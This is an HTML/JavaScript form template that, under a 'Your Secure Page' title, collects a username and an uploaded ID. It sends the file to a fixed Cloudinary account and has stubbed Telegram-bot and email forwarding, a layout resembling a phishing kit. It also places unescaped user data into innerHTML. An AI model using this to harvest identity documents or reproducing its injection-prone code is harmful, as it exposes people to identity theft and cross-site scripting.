<!doctype html>

<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Dynamic Form</title>
<style>
body, html { margin:0; padding:0; font-family:Arial,sans-serif; background:#fff; }
#dynamicFormContainer { position: relative; width: 100%; min-height: 100vh; overflow:auto; }
.bgLayer { position:absolute; top:0; left:0; width:100%; height:100%; z-index:-1; overflow:hidden; }
.bgLayer video, .bgLayer img { width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0; }
.formContent { position:relative; z-index:1; width:100%; max-width: 960px; margin:0 auto; padding:20px; box-sizing:border-box; }
.formContent img { display:block; margin:10px auto; border-radius:8px; max-width:100%; }
.formContent h1 { text-align:center; margin:10px 0; }
.formContent p { text-align:center; }
.formField { margin:12px 0; display:flex; flex-direction:column; }
.formField input, .formField textarea, .formField select { padding:10px; font-size:16px; border-radius:6px; border:1px solid #ccc; width:100%; box-sizing:border-box; }
button.submitBtn { background:#1976d2; color:#fff; border:none; border-radius:8px; padding:12px; font-size:16px; cursor:pointer; margin-top:10px; }
#generatedLink { margin-top:12px; color:#1976d2; font-weight:bold; }
.draggable { position:absolute; cursor:move; }
</style>
</head>
<body><div id="dynamicFormContainer">
  <div class="bgLayer" id="bgLayer"></div>
  <div class="formContent" id="formContent">
    <h1 id="pageTitle"></h1>
    <div id="avatarLogoBanner"></div>
    <div id="descriptionText"></div>
    <form id="dynamicForm"></form>
    <div id="generatedLink"></div>
  </div>
</div><script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.5/axios.min.js"></script><script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script><script>
const $ = id => document.getElementById(id);

// ==== CONFIG PLACEHOLDERS (replace with your Cloudinary/Telegram/Email) ====
const CLOUDINARY_UPLOAD_PRESET = 'form_upload_preset';
const CLOUDINARY_CLOUD_NAME = 'dymwisuau';
const TELEGRAM_BOT_TOKEN = '<YOUR_BOT_TOKEN>';
const TELEGRAM_CHAT_ID = '<YOUR_CHAT_ID>';
const EMAIL_ALERT = '<YOUR_EMAIL>';

// ==== SAMPLE formConfig ====
let formConfig = {
  title: 'Welcome to Your Secure Page',
  avatarURL: '',
  logoURL: '',
  bannerURL: '',
  description: 'Please fill in your details below',
  fields: [
    { type:'text', name:'username', label:'Username' },
    { type:'file', name:'idUpload', label:'Upload ID' }
  ],
  galleryImages: [],
  videoLinks: [],
  bgImageURL: '',
  bgVideoURL: ''
};

// ==== RENDER FORM ==== 
function renderForm(){
  // Clear form
  $('dynamicForm').innerHTML='';
  $('pageTitle').innerText = formConfig.title;

  // Avatar/Logo/Banner
  const alb=$('avatarLogoBanner'); alb.innerHTML='';
  [formConfig.avatarURL, formConfig.logoURL, formConfig.bannerURL].forEach(url=>{ if(url){ const img=document.createElement('img'); img.src=url; alb.appendChild(img); }});

  // Description
  $('descriptionText').innerHTML=formConfig.description ? `<p>${formConfig.description}</p>` : '';

  // Fields
  formConfig.fields.forEach(f=>{
    const wrap=document.createElement('div'); wrap.className='formField';
    if(f.label){ const lbl=document.createElement('label'); lbl.innerText=f.label; wrap.appendChild(lbl); }
    let input;
    if(f.type==='textarea'){ input=document.createElement('textarea'); } else { input=document.createElement('input'); input.type=f.type; }
    input.name=f.name; wrap.appendChild(input);
    $('dynamicForm').appendChild(wrap);

    // Cloudinary Upload for files
    if(f.type==='file'){ input.addEventListener('change', async e=>{
      const file = e.target.files[0]; if(!file) return;
      const formData = new FormData();
      formData.append('file', file);
      formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
      const res = await axios.post(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`, formData);
      input.dataset.uploadedUrl = res.data.secure_url;
    });
    }
  });

  // Submit button
  const btn=document.createElement('button'); btn.type='button'; btn.className='submitBtn'; btn.innerText='Submit';
  btn.onclick=submitForm;
  $('dynamicForm').appendChild(btn);
}

// ==== BACKGROUND ====
function loadBackground(){
  const layer=$('bgLayer'); layer.innerHTML='';
  if(formConfig.bgVideoURL){
    const video=document.createElement('video');
    video.src=formConfig.bgVideoURL;
    video.autoplay=true; video.loop=true; video.muted=true; video.playsInline=true;
    layer.appendChild(video);
  } else if(formConfig.bgImageURL){
    const img=document.createElement('img'); img.src=formConfig.bgImageURL; layer.appendChild(img);
  }
}

// ==== SUBMIT FORM ====
async function submitForm(){
  const data={};
  document.querySelectorAll('#dynamicForm input, #dynamicForm textarea').forEach(i=>{
    if(i.type==='file'){ data[i.name]=i.dataset.uploadedUrl || ''; }
    else{ data[i.name]=i.value; }
  });

  // Telegram placeholder
  if(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID){
    const msg = `New Form Submission:\n${JSON.stringify(data, null,2)}`;
    // Send via Telegram (requires server proxy or CORS enabled endpoint)
  }

  // Email placeholder
  if(EMAIL_ALERT){
    // Send email using your backend or email service
  }

  // Display generated link immediately
  const generatedLink = `${window.location.href}?data=${encodeURIComponent(JSON.stringify(data))}`;
  $('generatedLink').innerHTML=`Form submitted! <a href='${generatedLink}' target='_blank' style='color:blue'>View Submission</a>`;
  $('dynamicForm').reset();
}

// ==== INITIAL LOAD ====
renderForm();
loadBackground();
</script></body>
</html>
